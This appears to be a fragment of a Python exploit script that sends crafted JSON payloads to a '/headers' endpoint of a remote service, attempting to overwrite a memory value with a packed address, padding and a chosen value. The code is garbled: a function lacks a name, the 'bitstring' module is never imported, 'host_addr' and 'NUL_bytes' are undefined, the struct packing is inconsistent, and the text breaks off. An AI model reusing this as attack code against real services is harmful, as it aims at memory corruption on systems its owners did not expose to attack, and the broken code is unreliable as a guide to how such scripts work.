import _struct
import argparse
import requests
import json

# Set the default payload size
size = 84


# Define a function to send the payload
def send_payload(payload):
    data = {'size': len(payload),
            'buffer': payload
            }
    headers = {'Content-type': 'application/json'}
    r = requests.post(host_addr + "/headers",
                      data=json.dumps(data),
                      headers=headers)
    return r.status_code


# Define a function to overwrite a value in memory
# n is the number of bytes to send to overwrite the value
def (mem_addr, val, n=4):
    payload = bitstring.Bits()
    payload += bitstring.pack("uint:8", n)
    payload += _struct.pack("<" + "I" * n, mem_addr)
    payload += NUL_bytes * size
    payload += _struct.pack("<I", val)
    payload = payload.bytes

    status_code = send_payload(payload)
   
